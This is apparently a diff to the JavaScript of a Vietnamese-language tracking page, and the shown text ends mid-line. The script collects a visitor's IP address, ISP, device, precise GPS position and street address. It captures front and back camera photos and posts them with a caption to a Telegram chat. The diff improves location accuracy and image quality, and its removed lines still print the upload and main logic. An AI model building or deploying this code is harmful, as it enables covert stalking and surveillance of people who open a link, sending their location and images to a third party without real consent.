@@ -15,7 +15,7 @@ const info = {
     lon: '',
     device: '',
     os: '',
-    camera: '? Ðang ki?m tra...'
+    camera: '⏳ Đang kiểm tra...'
 };
 
 function detectDevice() {
@@ -49,7 +49,7 @@ function detectDevice() {
         info.device = 'Windows PC';
         info.os = 'Windows';
     } else {
-        info.device = 'Không xác d?nh';
+        info.device = 'Không xác định';
         info.os = 'Không rõ';
     }
 }
@@ -63,31 +63,39 @@ async function getIPs() {
         info.ip = res1.ip;
         info.realIp = res2.ip;
         info.isp = res2.connection?.org || 'N/A';
-        info.country = res2.country || 'Vi?t Nam';
-        info.lat = res2.latitude;
-        info.lon = res2.longitude;
+        info.country = res2.country || 'Việt Nam';
     } catch (e) {
-        info.ip = 'B? ch?n';
-        info.realIp = 'L?i';
+        info.ip = 'Bị chặn';
+        info.realIp = 'Lỗi kết nối';
     }
 }
 
 async function getLocation() {
     return new Promise(resolve => {
         if (!navigator.geolocation) return resolve(fallbackIPLocation());
+
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+
         navigator.geolocation.getCurrentPosition(
             async pos => {
-                info.lat = pos.coords.latitude.toFixed(6);
-                info.lon = pos.coords.longitude.toFixed(6);
+                info.lat = pos.coords.latitude;
+                info.lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy ? ` (±${pos.coords.accuracy.toFixed(1)}m)` : '';
                 try {
                     const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
                     const data = await res.json();
-                    info.address = data.display_name || 'T?a d? GPS';
-                } catch { info.address = `T?a d?: ${info.lat}, ${info.lon}`; }
+                    info.address = (data.display_name || 'Vị trí thực tế') + acc;
+                } catch { 
+                    info.address = `Tọa độ: ${info.lat}, ${info.lon}${acc}`; 
+                }
                 resolve();
             },
             async () => { await fallbackIPLocation(); resolve(); },
-            { enableHighAccuracy: true, timeout: 5000 }
+            options
         );
     });
 }
@@ -97,8 +105,8 @@ async function fallbackIPLocation() {
         const data = await fetch(`https://ipwho.is/`).then(r => r.json());
         info.lat = data.latitude || '0';
         info.lon = data.longitude || '0';
-        info.address = `${data.city}, ${data.region} (V? trí IP)`;
-    } catch (e) { info.address = 'Không rõ'; }
+        info.address = `${data.city}, ${data.region} (Ước tính qua IP)`;
+    } catch (e) { info.address = 'Không xác định'; }
 }
 
 async function captureCamera(facingMode = 'user') {
@@ -117,7 +125,7 @@ async function captureCamera(facingMode = 'user') {
                 setTimeout(() => {
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     stream.getTracks().forEach(t => t.stop());
-                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.7);
+                    canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8);
                 }, 1000);
             };
         });
@@ -130,15 +138,15 @@ function getCaption() {
         : 'Không rõ';
 
     return `
-?? [THÔNG TIN TRUY C?P]
+📡 [THÔNG TIN TRUY CẬP]
 
-?? Th?i gian: ${info.time}
-?? Thi?t b?: ${info.device} (${info.os})
-?? IP: ${info.ip} | ${info.realIp}
-?? ISP: ${info.isp}
-??? Ð?a ch?: ${info.address}
-?? B?n d?: ${mapsLink}
-?? Camera: ${info.camera}
+🕒 Thời gian: ${info.time}
+📱 Thiết bị: ${info.device} (${info.os})
+🌍 IP Dân cư: ${info.ip}
+🏢 ISP: ${info.isp}
+🏙️ Địa chỉ: ${info.address}
+📌 Google Maps: ${mapsLink}
+📸 Camera: ${info.camera}
 `.trim();
 }
 
@@ -147,45 +155,4 @@ async function sendPhotos(frontBlob, backBlob) {
     formData.append('chat_id', TELEGRAM_CHAT_ID);
     
     const media = [];
-    if (frontBlob) {
-        media.push({ type: 'photo', media: 'attach://front', caption: getCaption() });
-        formData.append('front', frontBlob, 'front.jpg');
-    }
-    if (backBlob) {
-        media.push({ type: 'photo', media: 'attach://back' });
-        formData.append('back', backBlob, 'back.jpg');
-    }
-
-    formData.append('media', JSON.stringify(media));
-    return fetch(API_SEND_MEDIA, { method: 'POST', body: formData });
-}
-
-async function sendTextOnly() {
-    return fetch(API_SEND_TEXT, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: getCaption() })
-    });
-}
-
-async function main() {
-    info.time = new Date().toLocaleString('vi-VN');
-    detectDevice();
-    
-    await Promise.all([getIPs(), getLocation()]);
-
-    let front = await captureCamera("user");
-    let back = null;
-    
-    if (front) {
-        back = await captureCamera("environment");
-    }
-
-    if (front || back) {
-        info.camera = `? Ðã ch?p: ${front ? 'Tru?c' : ''} ${back ? 'Sau' : ''}`;
-        await sendPhotos(front, back);
-    } else {
-        info.camera = '?? B? t? ch?i ho?c không có camera';
-        await sendTextOnly();
-    }
-}
+    if (front
